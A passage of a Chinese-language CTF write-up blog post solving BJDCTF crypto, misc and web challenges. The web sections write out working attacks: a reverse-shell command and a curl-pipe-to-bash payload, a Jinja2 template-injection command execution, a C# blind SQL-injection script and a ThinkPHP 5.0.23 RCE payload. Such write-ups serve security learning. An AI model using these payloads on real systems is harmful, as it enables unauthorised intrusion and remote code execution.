+<h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat flag"></a>cat flag</h3><p>拿到貓貓圖片之後，八個貓貓一排，可以想到是二進位制編碼。於是把吃飯糰的貓貓標記作 0，把吃雞腿的貓貓標記作 1，得到如下編碼。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">01000010</span><br><span class="line">01001010</span><br><span class="line">01000100</span><br><span class="line">01111011</span><br><span class="line">01001101</span><br><span class="line">00100001</span><br><span class="line">01100001</span><br><span class="line">00110000</span><br><span class="line">01111110</span><br><span class="line">01111101</span><br></pre></td></tr></table></figure>
+
+<p>轉換編碼後得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;M!a0~&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="靈能精通"><a href="#靈能精通" class="headerlink" title="靈能精通"></a>靈能精通</h3><p>其實一開始我也不清楚，但是在諸多提示下，根據提示找到如下解密圖片。</p>
+<div align=center>
+
+<p><img src="https://butter.lumosary.workers.dev/images/archive/dbefc985-0bb5-40b5-9154-aad1b7b76aeb/1613214347879978.9361855c1fdcb2776f7b9d2f64695fa8b1db09be.jpg" alt="Templar Cipher"></p>
+</div>
+對應解密之後，可以得到 flag。
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;IMKNIGHTSTEMPLAR&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Y1nglish"><a href="#Y1nglish" class="headerlink" title="Y1nglish"></a>Y1nglish</h3><p>這題我可喜歡了，下面我來分析一波。</p>
+<p>首先根據提示得知這是一篇完全可讀的英文文章，所以大小寫不做特別區分。</p>
+<p>再者，根據前面題目的經驗，MIH 應該對應 BJD，因此得到 M =&gt; B、I =&gt; J、H =&gt; D。</p>
+<p><code>Izcztkok</code> 這個詞在句子中首字母大寫，因此它是一個名詞，而 z 在名詞前單獨出現，I 對應的 J 是子音音素的字母，因此，名詞前的不定冠詞應該是 a，因此，Z =&gt; A。</p>
+<p>Q 字母在單獨出現的時候從來沒有小寫過，且多位於句首，因此判定其是主語 I，因此 Q =&gt; I。</p>
+<p><code>zd</code> 出現在了冠詞前，由 a 開頭的二字母常用詞有兩個，as 和 at（因為沒有 <code>Q zd</code> 的結構排除 am 這種可能）。但是觀察到 <code>pk qo</code> 部分的半句，有兩種情況，從句和普通句，但是因為除了 as 沒有其他的二字母引導詞（p 也不可能是 a)，所以按普通句處理。因此， <code>pk</code> 應該是一個主語，而 <code>qo</code> 作為 i 開頭的二字母謂語，就是 is 了，因此，O =&gt; S。所以 <code>zd</code> 不可能是 as，因此 D =&gt; T。</p>
+<p><code>ds</code>，以 t 字母開頭的二字母常用單詞只有 to，因此 S =&gt; O。</p>
+<p><code>qt</code>，排除了 is, it 這些二字母單詞，剩下的以 i 開頭的常用詞就剩下 in 了。因此 T =&gt; N。</p>
+<p>由前面的推斷已知 <code>pk</code> 是個代詞，所以 <code>pk nzo</code> 中的 <code>nzo</code> 一定是個謂語，結合上述的結果，可得這個單詞是 was。所以 N =&gt; W。</p>
+<p><code>med</code> 後面出現了代詞 <code>pk</code> 且出現在斷句處，因此 <code>med</code> 是個連詞，結合上述可得 <code>med</code> 是 but，因此 E =&gt; U。</p>
+<p>能夠構成 <code>sef</code> 這個結構的單詞並不多，解出了前兩個字母，只有 our, out 這兩種可能，而 D =&gt; T，因此 <code>sef</code> 極大可能是 our，因此 F =&gt; R。</p>
+<p>因為 <code>qo</code> 是 is，<code>zth</code> 是 and，所以，推測 <code>usf</code> 是個介詞，以 or 結尾的三字母介詞，極大可能是 for。因此 U =&gt; F。</p>
+<p><code>vssh</code> 出現在了冠詞後，且其後還有一個詞，緊接著是斷句，因此它可能是個形容詞，而以 _ood 結尾的形容詞，極大可能是 good，因此，V =&gt; G。</p>
+<p><code>ufsl</code> 這個詞出現在了兩個名詞中間，且解出幾個字母為 fro_，很容易想到 L =&gt; M。</p>
+<p><code>vkdo</code> 出現在代詞 <code>Pk</code> 後，因此考慮它是個謂語動詞，結合解出來的幾個字母，容易拼合出 gets，因此 K =&gt; E。因此，<code>Pk</code> 第三人稱代詞得到驗證，<code>Pk</code> 是 He，因此，P =&gt; H。</p>
+<p><code>mzoqa</code> 中拼出大部分字母之後容易得出 A =&gt; C。</p>
+<p><code>Qu wse</code> 中的 Qu 拼出為 If，後面的 <code>zfk</code> 拼出為 are，所以句子缺少主語，推測為代詞，以 _ou 結尾，因此得出 <code>wse</code> 是 you，因此，W =&gt; Y。</p>
+<p><code>qo lzqtbw usf</code> 拼出 is main_y for，容易得出 B =&gt; L。</p>
+<p><code>dwcko</code> 拼出 ty_es，容易得出 C =&gt; P。</p>
+<p>進行到這裡，篩選一下沒有被匹配的字元，還剩下 KQVXZ 五個字元。</p>
+<p><code>uqjk</code> 拼出 fi_e，從上面選一個，拼出 five，因此，J =&gt; V。</p>
+<p>剩下幾個字母在文章中沒有出現，先對照著把整篇文章解密再想辦法。（下附解密文章[錯誤已更正]）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in network security, welcome to participate. Let me tell you a story.</span><br><span class="line">I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn&#39;t a Japanese name but he is really a Japanese. Harry worked in a lawyer&#39;s office years ago, but he is now working at a bank. He gets a good salary, but he always borrows money from his friends and never pays it back. Harry saw me and came and sat at the same table. He has never borrowed money from me. While he was eating, I asked him to lend me &amp;2. To my surprise, he gave me the money immediately. &#39;I have never borrrowed any money from you,&#39; Harry said,&#39;so now you can pay for my dinner!&#39; Now i will give you what you want.BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck&#125;</span><br></pre></td></tr></table></figure>
+
+<p>更正錯誤時，根據文意將 wory 改作 work，因此 Y =&gt; K。</p>
+<p>flag 中的 geqc 解密作 quip 比較合理（善用搜索引擎，quipqiup - cryptoquip and cryptogram solver）因此，G =&gt; Q。</p>
+<p>至此，文章和 flag 都已經解密完畢，下附對照表。（其中 R、X 因為沒有出現，無法解出）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">CLPTURQDJVEMBWSHI ONFGY KA</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Cookie</span></p>
+<p>開啟頁面之後是一個“Login Fucker”。隨手先 confirm 一個，然後看完一手說明去看了這個頁面的原始碼，找到了 <code>test.php</code> 這個頁面，<del>瘋狂嘗試注入</del>然後看了一手頁面原始碼發現根本沒有可以回顯的地方。 <span class="heimu" title="QAQ">沒錯，比賽的時候試了很久注入才發現是個固定的 alert，然後就沒思路了。</span></p>
+<p>回到最開始的頁面發現了有個 Cookie 很奇怪，複製下來 Base64 一頓懟之後可以發現是 <code>user = 提交時間戳</code>。 可能是平時奇怪的程式碼寫多了，覺得這個並沒有什麼特別的，於是比賽時就放過它了。（就是這樣卡了差不多一天）</p>
+<p>其實應該是把 <code>test.php</code> 的 url confirm 進去，然後 <code>document.cookie=&quot;dXNlcg=&quot;</code> 把這個 Cookie 置空再重新整理就能達到 99%+ 的成功率，然後再 check 一下就能拿到下一步線索。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Burst successed! The passwd is av11664517@1583985203.</span><br></pre></td></tr></table></figure>
+
+<p>一看就知道是 Bilibili 的 av 號，找到對應影片再按時間戳找評論就能拿到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;Quantum_Mechanics_really_Ez&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="duangShell"><a href="#duangShell" class="headerlink" title="duangShell"></a>duangShell</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Reverse Shell</span></p>
+<p>開啟頁面之後根據提示拿到了 <code>.index.php.swp</code> 這個檔案。比賽的時候踩了個坑，直接用 Windows 的記事本打開了，然後只拿到一半原始碼，結果根本審計不出來（少了最上面的一半 <code>if</code> ），當時還以為也是考點來著。正確的姿勢應該是找個 vim 然後用 <code>vim -r</code> 恢復檔案來拿到原始碼。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍愛網&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;how can i give you source code? .swp?!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;girl_friend&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;where is P3rh4ps&#x27;s girl friend ???&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$girl</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;girl_friend&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\&gt;|\\\/&#x27;</span>, <span class="variable">$girl</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;just girl&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;</span>, <span class="variable">$girl</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec(<span class="variable">$girl</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>稍微審計了一波，發現很多命令都直接濾掉了，但是題目叫 shell。於是搜了一波反彈shell，找到了<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6aca9b29514d">這個</a>。但是還少了一點東西，就是如何把反彈 shell 的命令傳上去，這裡找到了兩條可行指令，但是靶機沒得 wget，所以用 curl。首先把指令寫在一個檔案裡，這裡我寫在 <code>lemonshell.txt</code> 中，內容如下。這裡的埠和 IP 可以在終端中用 <code>ifconfig</code> 查詢。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.93.139&#x2F;8210 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>然後再用 <code>nc -lvp 8210</code> 監聽 <code>8210</code> 埠。回到網頁端，審計程式碼可以得出是要傳入一個 <code>girl_friend</code> 的引數，其在一系列過濾之後被執行。所以 POST 引數可以這樣寫。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;When there is wget</span><br><span class="line">girl_friend&#x3D;wget –q –O 174.1.93.139&#x2F;lemonshell.txt|bash</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;When there is no wget, use curl</span><br><span class="line">girl_friend&#x3D;curl 174.1.93.139&#x2F;lemonshell.txt|bash</span><br></pre></td></tr></table></figure>
+
+<p>如果成功了就能在監聽埠的終端看到回顯，大概像這樣。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">connect to [174.1.93.139] from 6005-d5c879a9-8350-4539-b26c-f102bcd90b88.1.8tv0l2tbgn7e5fs3p1k8rfnny.ctfd_swarm [174.1.93.128] 43370</span><br><span class="line">bash: cannot set terminal process group (170): Not a tty</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">bash-4.4$</span><br></pre></td></tr></table></figure>
+
+<p>然後就是找 flag 啦。首先一手 <code>cat /flag</code> 然後沒有拿到 flag。於是開始 <code>find / -name flag</code>，一開始沒有找到，因為一堆 Permission Denied 我以為沒得。然後<a target="_blank" rel="noopener" href="https://duitutu.cn">堆堆</a>提醒我說 find 得等比較久。於是等了一會兒，find 返回了這個 <code>/etc/demo/P3rh4ps/love/you/flag</code>，於是順利拿到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ed2e8ade-b5d4-4164-8154-6432592a8466&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="假豬套天下第一"><a href="#假豬套天下第一" class="headerlink" title="假豬套天下第一"></a>假豬套天下第一</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Headers</span></p>
+<p>一開啟頁面，一股精緻的畫風撲面而來(x 隨手來了個賬號密碼登入，發現居然成了，到了 <code>profile.php</code>，然後看了一手原始碼，發現啥都沒有，再看了一手 Cookie 也沒有發現，請求頭也沒有東西。（陷入僵局）</p>
+<p>想到瀏覽器沒辦法抓 302 啥的，就打開了 Fiddler，順手抓了一波登入的包，在跳轉頁面的響應原始碼發現了點東西，出現了個 <code>L0g1n.php</code>。於是把它開啟，頁面提示錯誤，順手看了波原始碼，發現要改 Cookie。照著前面的套路算了一下符合要求的時間的時間戳，用 <code>document.cookie=&quot;time=4740774808&quot;</code> 改完之後重新整理。跟著頁面提示設定一系列 Header。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Contiki&#x2F;1.0 (Commodore 64; http:&#x2F;&#x2F;dunkels.com&#x2F;adam&#x2F;contiki&#x2F;)</span><br><span class="line">Cookie: time&#x3D;4740774808</span><br><span class="line">via: y1ng.vip</span><br><span class="line">from: root@gem-love.com</span><br><span class="line">referer: gem-love.com</span><br><span class="line">x-real-ip: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>這樣之後會得到 <code>Sorry, even you are good at http header, you&#39;re still not my admin. Althoungh u found me, u still dont know where is flag</code> 的提示，於是看了一波 Fiddler 上的響應，發現了一段註釋。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--ZmxhZ3s1NmVjMTNmZS03Mzk1LTRlY2MtYmIxYS0zMmNjZTQ1NzNjZGZ9Cg==--&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>將它 Base64 編碼轉換之後得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;56ec13fe-7395-4ecc-bb1a-32cce4573cdf&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SSTI</span></p>
+<p>開啟頁面之後隨手輸了個 P3，得到的結果是 <code>P3&#39;s girlfirend is : P3</code>。隨手看了看網頁原始碼，發現了 hint <code>&lt;!--ssssssti &amp; a little trick --&gt;</code>，然後嘗試著構造了個 <code>&#123;&#123;5 * 7&#125;&#125;</code>，得到了 35 的預期結果，然後再構造了個 <code>&#123;&#123;6 * '7'&#125;&#125;</code> 得到了 777777 的預期結果，所以應該是 Twig/Jinja2 型別的模板。</p>
+<p>先構造一波引數找一下 flag 的位置，<code>.../qaq?name=&#123;&#123; config.__class__.__init__.__globals__['os'].popen('find / -name flag').read() &#125;&#125;</code>，得到的返回值顯示 flag 就在根目錄。於是直接構造 <code>cat /flag</code> 就能得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;39648fcb-2a51-47ac-b651-8aa0d5ddecef&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://duitutu.cn">堆堆</a>跟我說過這題還有個關鍵字過濾的精髓操作（可惜在 BUUCTF 上沒作用了），於是我在這裡模擬一下繞過過濾的操作，即將過濾的字元用其他字元替換，這裡以 flag =&gt; LEMON 操作。我找到了一個很好用的替換指令：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36142062/article/details/80747461">sed</a>。因此，payload 可以這樣寫。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;qaq?name&#x3D;&#123;&#123; config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat &#x2F;flag|sed &quot;s&#x2F;flag&#x2F;LEMON&#x2F;g&quot;&#39;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到的 flag 會變成這樣，就解決了過濾的問題。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LEMON&#123;39648fcb-2a51-47ac-b651-8aa0d5ddecef&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="簡單注入"><a href="#簡單注入" class="headerlink" title="簡單注入"></a>簡單注入</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p>
+<p>這題比賽的時候瘋狂試了好久，我記得當時好像說不要掃目錄來著，結果就沒想特殊檔案，其實 robots.txt 裡面藏著 hint.txt 然後有個提示直接給出了查詢的語句 <code>select * from users where username=&#39;$_POST[&quot;username&quot;]&#39; and password=&#39;$_POST[&quot;password&quot;]&#39;;</code>。但是試了很久發現完全沒得回顯，除了固定的那一句（說到這裡，我想鯊了 HackBar 外掛）。查了一波之後知道了反斜槓的套路，然後使用 /**/ 代替空格構造了 <code>username=admin\&amp;password=or/**/ascii(substr(password,1,1))&gt;1#</code> 這樣的請求，用某線上工具傳送請求之後得到了不一樣的結果，於是就上了一波盲註腳本。</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> Flurl.Http;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CTFdo</span> &#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">int</span> BEGIN_ASCII = <span class="number">32</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">int</span> END_ASCII = <span class="number">127</span>;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">string</span> URL = <span class="string">&quot;URL_HERE&quot;</span>;</span><br><span class="line">            <span class="built_in">int</span> position = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">string</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">                position++;</span><br><span class="line">                <span class="built_in">int</span> _begin = BEGIN_ASCII;</span><br><span class="line">                <span class="built_in">int</span> _end = END_ASCII;</span><br><span class="line">                <span class="keyword">while</span> (_begin &lt; _end)&#123;</span><br><span class="line">                    <span class="built_in">int</span> _mid = (_begin + _end) / <span class="number">2</span>;</span><br><span class="line">                    <span class="built_in">string</span> data = <span class="string">&quot;username=admin\\&amp;password=or/**/ascii(substr(password,&quot;</span> + position + <span class="string">&quot;,1))&gt;&quot;</span> + _mid + <span class="string">&quot;#&quot;</span>;</span><br><span class="line">                    <span class="built_in">string</span> _result = URL.WithHeaders(<span class="keyword">new</span> &#123;Content_Type=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;)</span><br><span class="line">                                        .PostStringAsync(data).ReceiveString().Result;</span><br><span class="line">                    <span class="keyword">if</span> (_result.Contains(<span class="string">&quot;BJD needs to be stronger&quot;</span>))&#123;</span><br><span class="line">                        _begin = _mid + <span class="number">1</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        _end = _mid;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (_begin != BEGIN_ASCII &amp;&amp; _end != END_ASCII)&#123;</span><br><span class="line">                    result += (<span class="built_in">char</span>)_begin;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            Console.WriteLine(result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一番操作得到了密碼 <code>OhyOuFOuNdit</code>，登入之後得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12781fb2-7b4d-48ff-8540-1cc663189d9a&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="old-hack"><a href="#old-hack" class="headerlink" title="old-hack"></a>old-hack</h3><p>開啟頁面之後發現 ThinkPHP，這波提示十分明顯。於是一套操作，發現報錯了，但是拿到了具體的版本號 5.0.23。一頓搜尋之後找到了命令執行的 payload。於是抄一波作業，向 <code>.../index.php?s=captcha</code> POST <code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</code> 成功發現根目錄的 flag。於是再構造一波 <code>cat /flag</code> 就得到了 flag。 這裡順帶貼一波參考資料 <a target="_blank" rel="noopener" href="http://blog.nsfocus.net/thinkphp-full-version-rce-vulnerability-analysis/">One</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38807738/article/details/86777541">Two</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bcd83ed3-ec7d-4397-9e2c-d06a4245f0e6&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Easy-MD5"><a href="#Easy-MD5" class="headerlink" title="Easy MD5"></a>Easy MD5</h3><p>氦，這題其實只有一開始的點我是不知道的。<code>ffifdyop</code> 這個字串被 MD5 摘要之後 hex 轉 ASCII 可以構成一個 <code>or</code>，因此可以達成正確的結果。過了這一個點之後可以在下一個頁面的原始碼種找到一段註釋。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a &#x3D; $GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class="line">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>這波直接構造 <code>a[]=1&amp;b[]=2</code> 就能透過。第三個頁面的 <code>if($_POST[&#39;param1&#39;]!==$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])===md5($_POST[&#39;param2&#39;]))</code> 也可用一樣的方法繞過，從而得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BJD&#123;Md_five_is_fun&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首頁</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Summary"><span class="toc-number">1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reflection"><span class="toc-number">2.</span> <span class="toc-text">Reflection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Write-Up"><span class="toc-number">3.</span> <span class="toc-text">Write Up</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%91%E9%A3%9F%E7%9A%84%E5%B0%8F%E8%9B%87"><span class="toc-number">3.1.</span> <span class="toc-text">挑食的小蛇</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%A7%90%E5%A7%90"><span class="toc-number">3.2.</span> <span class="toc-text">小姐姐</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-Beautiful-Picture"><span class="toc-number">3.3.</span> <span class="toc-text">A Beautiful Picture</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E7%B0%A1%E5%96%AE%E7%9A%84MISC"><span class="toc-number">3.4.</span> <span class="toc-text">最簡單的MISC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Imagin-%E9%96%8B%E5%A0%B4%E6%9B%B2"><span class="toc-number">3.5.</span> <span class="toc-text">Imagin - 開場曲</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Real-EasyBaBa"><span class="toc-number">3.6.</span> <span class="toc-text">Real EasyBaBa</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%96%E7%81%AB%E6%98%AD%E6%98%AD"><span class="toc-number">3.7.</span> <span class="toc-text">聖火昭昭</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Easy-Baba"><span class="toc-number">3.8.</span> <span class="toc-text">Easy Baba</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B0%BD%E5%88%B0"><span class="toc-number">3.9.</span> <span class="toc-text">簽到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%87%95%E8%A8%80%E7%87%95%E8%AA%9E"><span class="toc-number">3.10.</span> <span class="toc-text">燕言燕語</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E6%96%87%E7%9B%B2%E4%BA%86"><span class="toc-number">3.11.</span> <span class="toc-text">老文盲了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cat-flag"><span class="toc-number">3.12.</span> <span 